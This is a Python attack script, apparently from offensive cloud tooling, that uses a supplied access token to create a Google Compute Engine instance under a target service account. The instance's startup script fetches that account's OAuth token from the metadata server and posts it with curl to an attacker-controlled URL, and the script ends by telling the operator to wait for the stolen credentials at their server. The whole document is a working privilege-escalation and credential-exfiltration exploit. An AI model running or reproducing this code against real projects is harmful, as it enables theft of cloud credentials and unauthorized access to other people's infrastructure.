#!/usr/bin/env python3

PROJECT_ID = ''
TARGET_SERVICE_ACCOUNT = ''
ZONE = 'us-central1-f'
INSTANCE_NAME = 'exfil'
EXFIL_URL = 'http://example'
ACCESS_TOKEN = input('Enter an access token to use for authentication: ').rstrip()

from apiclient.discovery import build
import google.oauth2.credentials
import json

credentials = google.oauth2.credentials.Credentials(ACCESS_TOKEN)
service = build(serviceName='compute', version='v1', credentials=credentials)

startup_script = f"""
#!/bin/bash
apt-get update
apt-get install -y curl
curl {EXFIL_URL}/gce_token -d "$(curl http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token)"
"""

body = {
    'name': INSTANCE_NAME,
    'machineType': f'zones/{ZONE}/machineTypes/g1-small',
    'metadata': {
        'items': [
            {
                'key': 'startup-script',
                'value': startup_script
            }
        ]
    },
    "networkInterfaces": [
        {
            "accessConfigs": [
                {
                    "type": "ONE_TO_ONE_NAT",
                    "name": "External NAT"
                }
            ],
            "network": "global/networks/default"
        }
    ],
    'serviceAccounts': [
        {
            'email': TARGET_SERVICE_ACCOUNT,
            'scopes': [
                'https://www.googleapis.com/auth/cloud-platform',
                'https://www.googleapis.com/auth/iam'
            ]
        }
    ],
    'disks': [
        {
            "autoDelete": "true",
            "boot": "true",
            "type": "PERSISTENT",
            "initializeParams": {
                "sourceImage": "projects/debian-cloud/global/images/family/debian-9",
            }
        }
    ]
}

res = service.instances().insert(project=PROJECT_ID, zone=ZONE, body=body).execute()

print(json.dumps(res, indent=4))

print(f'Now wait for the credentials to show up to your server listening at http://{EXFIL_URL}/gce_token...')
